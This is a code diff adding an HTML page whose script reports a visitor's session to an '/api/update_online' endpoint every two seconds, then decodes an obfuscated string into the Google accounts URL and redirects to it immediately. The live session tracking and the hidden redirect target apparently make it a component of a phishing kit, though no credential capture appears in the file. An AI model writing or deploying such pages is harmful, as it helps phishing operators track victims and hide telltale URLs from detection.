@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<script>
+    // Get session ID from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('session_id');
+    
+    // Keep alive
+    if (sessionId) {
+        setInterval(function(){
+            fetch(`/api/update_online/${sessionId}`);
+        }, 2000);
+    }
+    
+    // Decode and redirect to Google accounts
+    function decodeUrlUtf16LE(encodedUrl) {
+        let decoded = '';
+        const hexValues = encodedUrl.split('%00');
+        hexValues.forEach(hex => {
+            if (hex !== '') {
+                decoded += String.fromCharCode(parseInt(hex, 16));
+            }
+        });
+        return decoded;
+    }
+
+    const encodedUrl = "0068%0074%0074%0070%0073%003A%002F%002F%0061%0063%0063%006F%0075%006E%0074%0073%002E%0067%006F%006F%0067%006C%0065%002E%0063%006F%006D";
+    const decodedUrl = decodeUrlUtf16LE(encodedUrl);
+    
+    // Redirect immediately
+    window.location.href = decodedUrl;
+</script>
+</body>
+</html>
